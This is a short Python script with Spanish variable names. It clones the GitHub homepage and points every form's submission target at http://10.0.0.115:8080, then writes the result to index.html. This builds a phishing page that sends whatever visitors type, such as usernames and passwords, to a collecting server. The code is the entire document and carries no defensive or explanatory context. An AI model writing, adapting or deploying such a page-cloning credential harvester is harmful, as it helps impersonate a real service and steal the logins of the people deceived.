import requests
from bs4 import BeautifulSoup

URL = "https://github.com/"
req = requests.get(URL)

soup = BeautifulSoup(req.text, 'lxml')

formularios = soup.find_all("form")

for form in formularios:
    form["action"] = "http://10.0.0.115:8080"

with open("index.html", "w", encoding="utf-8") as file:
    file.write(str(soup))
